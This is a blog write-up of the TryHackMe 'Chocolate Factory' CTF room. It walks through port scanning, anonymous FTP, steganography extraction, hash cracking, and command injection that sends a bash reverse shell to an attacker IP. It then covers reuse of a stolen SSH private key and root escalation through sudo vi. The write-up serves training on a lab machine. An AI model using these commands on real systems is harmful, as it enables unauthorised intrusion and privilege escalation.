---
layout: post
title: Chocolate Factory
date:   2025-09-30 11:05
description: TryHackMe chocolate factory CTF Write-Up
tags: tryhackme 
comments: false
---
-TRYHACKME CTF WRITEUP-
<br>
<br>
![img]({{ '/assets/images/wonka/choc.jpeg' | relative_url }}){: .center-image }
[Link To CTF](https://tryhackme.com/room/chocolatefactory)
<br>
<br>
<br>
## We start of by enumerating the open ports with nmap

## Looking at our output we see:
![img]({{ '/assets/images/wonka/1-wonka.png' | relative_url }}){: .center-image }
<br>

## Running our Nmap scan with the -sCV flag 
## We can see the directory path of the secret key
![img]({{ '/assets/images/wonka/2-wonka.png' | relative_url }}){: .center-image }
<br>

## Moving here on our webpage we can download the key_rev_key file
{% highlight bash %}
http://x.x.x.x/key_rev_key
{% endhighlight bash %}
![Battery Widget]({{ '/assets/images/wonka/3-wonka.png' | relative_url }}){: .center-image }

## Looking at this file we can see it's an elf file and already compiled
<br>

## lets run the program:
{% highlight bash %}
./key_rev_key
{% endhighlight bash %}

## permission denied - we will have to modify permissions

{% highlight bash %}
chmod +x key_rev_key
{% endhighlight bash %}

## Now lets run it again:
![Battery Widget]({{ '/assets/images/wonka/4-wonka.png' | relative_url }}){: .center-image }
<br>

## Looks like it's asking for a name
## I tested willy, Mrwonka & Charlie, but they all failed 
## Lets instead run strings on the file for more clues
{% highlight bash %}
$ strings key_rev_key 
{% endhighlight bash %}
![Battery Widget]({{ '/assets/images/wonka/5-wonka.png' | relative_url }}){: .center-image }
<br>

## We now see the key and the answer to question #1
{% highlight bash %}
" congratulations you have found the key:   
[redacted]
Keep it safe "
{% endhighlight bash %}
<br>

## While we have the key we dont really know what this is used for yet
## Lets move to port 21 and see if anonymous login is allowed
![Battery Widget]({{ '/assets/images/wonka/6-wonka.png' | relative_url }}){: .center-image }

## Anonymous is allowed ! 
## Lets logon to the ftp server
![Battery Widget]({{ '/assets/images/wonka/7-wonka.png' | relative_url }}){: .center-image }
<br>

## We see 'gum_room.txt' file
## Lets download this and inspect it
![Battery Widget]({{ '/assets/images/wonka/8-wonka.png' | relative_url }}){: .center-image }
<br>

## Running strings on the file doesn't show us much useful output
## Lets run steghide extract any hidden data
![Battery Widget]({{ '/assets/images/wonka/9-wonka.png' | relative_url }}){: .center-image }


## We get our output in the b64.txt file
## As the name suggests we have Base64 encoded data

## Lets decode it here: 
## [base64decode](https://www.base64decode.org/)
<br>

## We get what looks like a shadow file
## At the very end we see the user Charlie and a password hash
## Lets crack this hash:
## [hashes.com](https://hashes.com/en/decrypt/hash)

## We now get the password for Charlie !
![Battery Widget]({{ '/assets/images/wonka/10-wonka.png' | relative_url }}){: .center-image }
## This gives our answer to question 2 
<br>

## Lets see where we can use this username and password
## SSH and FTP both failed to authenticate
## Lets try and access the web server instead
![Battery Widget]({{ '/assets/images/wonka/11-wonka.png' | relative_url }}){: .center-image }

## We are able to login successfully as Charlie
## We see immediately that there is a command prompt box
![Battery Widget]({{ '/assets/images/wonka/12-wonka.png' | relative_url }}){: .center-image }


## Lets build a reverse shell and start our netcat listener
## [reverse-shell-cheat-sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet])
<br>

## First on our attacker machine we will run the command:
{% highlight bash %}
$ nc -lvnp <port of choice>
{% endhighlight bash %}

## Then in the command prompt of the web page we will put our reverse shell:
{% highlight bash %}
/bin/bash -c 'bash -i >& /dev/tcp/IP_address/4444 0>&1'
{% endhighlight bash %}
![Battery Widget]({{ '/assets/images/wonka/13-wonka.png' | relative_url }}){: .center-image }
<br>

## This gives us a shell back to our listener
## But we only have www-data access
![Battery Widget]({{ '/assets/images/wonka/14-wonka.png' | relative_url }}){: .center-image }
<br>

## It looks like the user flag is in charlie's home directory and we don't have access
## Looking around we see a file called teleport and teleport.pub
## Weird could these be public and private key files?
<br>

## Opening this, we can see the private key inside: >"/home/charlie/teleport"
![Battery Widget]({{ '/assets/images/wonka/15-wonka.png' | relative_url }}){: .center-image }

## Lets save this into a text file on our machine
## Lets modify the permissions and see if we can get ssh access with these credentials
<br>

## First copy and paste the entire private key file text onto your machine
## Then run:
{% highlight bash %}
$ chmod +x <private_key_file>
{% endhighlight bash %}

## Lets now try authenticate into ssh as Charlie
{% highlight bash %}
ssh -i id_rsa_file charlie@xxxx
{% endhighlight bash %}

## We get access as Charlie !
![Battery Widget]({{ '/assets/images/wonka/16-wonka.png' | relative_url }}){: .center-image }
 <br>

## Lets capture the user flag
{% highlight bash %}
cat /home/charlie/user.txt
{% endhighlight bash %}
![Battery Widget]({{ '/assets/images/wonka/17-wonka.png' | relative_url }}){: .center-image }
<br>
<br>
<br>
# Priv Esc
<br>
<br>

## We see sudo -l shows Charlie can run vi commands as root
![Battery Widget]({{ '/assets/images/wonka/18-wonka.png' | relative_url }}){: .center-image }
<br>

## Looking for binary exploits we see a vi script:
## [gtfobins/vi/#sudo](https://gtfobins.github.io/gtfobins/vi/#sudo)
{% highlight bash %}
$ sudo vi -c ':!/bin/sh' /dev/null
{% endhighlight bash %}

## Entering this command is successful
## We now get root access
![Battery Widget]({{ '/assets/images/wonka/19-wonka.png' | relative_url }}){: .center-image }

## It looks like the root flag is contained within a python script:
![Battery Widget]({{ '/assets/images/wonka/20-wonka.png' | relative_url }}){: .center-image }

## Lets try and run it:
{% highlight bash %}
python3 ./root.py
{% endhighlight bash %}
<br>

## Looks like we need the key we found earlier
![Battery Widget]({{ '/assets/images/wonka/22-wonka.png' | relative_url }}){: .center-image }
 
## Entering this we can now get the root flag and pwn this machine !!!
